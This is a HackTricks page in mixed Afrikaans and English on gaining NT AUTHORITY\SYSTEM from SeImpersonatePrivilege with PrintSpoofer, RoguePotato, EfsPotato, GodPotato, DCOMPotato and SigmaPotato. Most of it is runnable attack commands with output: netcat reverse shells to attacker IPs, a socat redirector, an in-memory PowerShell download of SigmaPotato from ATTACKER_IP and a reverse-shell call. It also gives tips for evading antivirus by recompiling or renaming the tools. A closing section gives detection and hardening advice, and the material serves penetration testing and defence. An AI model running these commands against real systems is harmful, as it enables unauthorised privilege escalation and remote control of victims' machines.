# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato werk nie op Windows Server 2019 en Windows 10 build 1809 en later nie.** However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> 'n Moderne alternatief wat gereeld in 2024–2025 onderhou word, is SigmaPotato (a fork of GodPotato) wat in-memory/.NET reflection gebruik en uitgebreide OS-ondersteuning toevoeg. Sien vinnige gebruik hieronder en die repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Vereistes en algemene valstrikke

Al die volgende tegnieke berus op die misbruik van 'n impersonasie-bevoegde bevoorregte diens vanuit 'n konteks wat een van die volgende voorregte het:

- SeImpersonatePrivilege (mees algemeen) or SeAssignPrimaryTokenPrivilege
- Hoë integriteit is nie benodig nie as die token reeds SeImpersonatePrivilege het (tipies vir baie diensrekeninge soos IIS AppPool, MSSQL, ens.)

Kontroleer voorregte vinnig:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- As jou shell onder 'n beperkte token loop wat nie SeImpersonatePrivilege het nie (algemeen vir Local Service/Network Service in sekere kontekste), kry die rekening se standaardprivileges terug met FullPowers, en hardloop dan 'n Potato. Voorbeeld: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer benodig die Print Spooler service wat loop en bereikbaar is oor die plaaslike RPC-endpoint (spoolss). In geharde omgewings waar Spooler na PrintNightmare gedeaktiveer is, verkies RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato vereis 'n OXID resolver wat bereikbaar is op TCP/135. As egress geblokkeer is, gebruik 'n redirector/port-forwarder (sien voorbeeld hieronder). Ouer builds het die -f vlag benodig.
- EfsPotato/SharpEfsPotato misbruik MS-EFSR; as een pipe geblokkeer is, probeer alternatiewe pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Fout 0x6d3 tydens RpcBindingSetAuthInfo dui gewoonlik op 'n onbekende of onondersteunde RPC-authentiseringsdiens; probeer 'n ander pipe/transport of verseker dat die teikendiens loop.

## Vinnige Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Aantekeninge:
- Jy kan -i gebruik om 'n interaktiewe proses in die huidige konsole te spawn, of -c om 'n eenreël-opdrag uit te voer.
- Vereis die Spooler-diens. As dit gedeaktiveer is, sal dit misluk.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
As uitgaande poort 135 geblokkeer is, pivot die OXID resolver via socat op jou redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Wenk: As een pipe misluk of EDR dit blokkeer, probeer die ander ondersteunde pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Aantekeninge:
- Werk op Windows 8/8.1–11 en Server 2012–2022 wanneer SeImpersonatePrivilege aanwesig is.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato bied twee variante wat mik op service DCOM-objekte wat standaard op RPC_C_IMP_LEVEL_IMPERSONATE staan. Bou of gebruik die verskafte binaries en voer jou opdrag uit:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato voeg moderne geriewe by, soos in-memory execution via .NET reflection en 'n PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Opsporing en hardening notas

- Monitor vir prosesse wat named pipes skep en onmiddellik token-duplication APIs aanroep, gevolg deur CreateProcessAsUser/CreateProcessWithTokenW. Sysmon kan nuttige telemetrie openbaar: Event ID 1 (process creation), 17/18 (named pipe created/connected), en command lines wat child processes as SYSTEM spawn.
- Spooler hardening: Deaktiveer die Print Spooler service op servers waar dit nie nodig is nie om PrintSpoofer-style plaaslike coercions via spoolss te voorkom.
- Service account hardening: Minimaliseer die toewysing van SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege aan custom services. Oorweeg om dienste onder virtual accounts met die minste vereiste privileges te laat loop en hulle te isoleer met service SID en write-restricted tokens waar moontlik.
- Network controls: Die blokkering van uitgaande TCP/135 of die beperking van RPC endpoint mapper-verkeer kan RoguePotato breek tensy 'n interne redirector beskikbaar is.
- EDR/AV: Al hierdie tools is wyd deur signatures gedek. Hersamestelling vanaf source, hernoem van symbols/strings, of die gebruik van in-memory execution kan opsporing verminder maar sal robuuste gedragsdetecties nie teëkom nie.

## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)

{{#include ../../banners/hacktricks-training.md}}
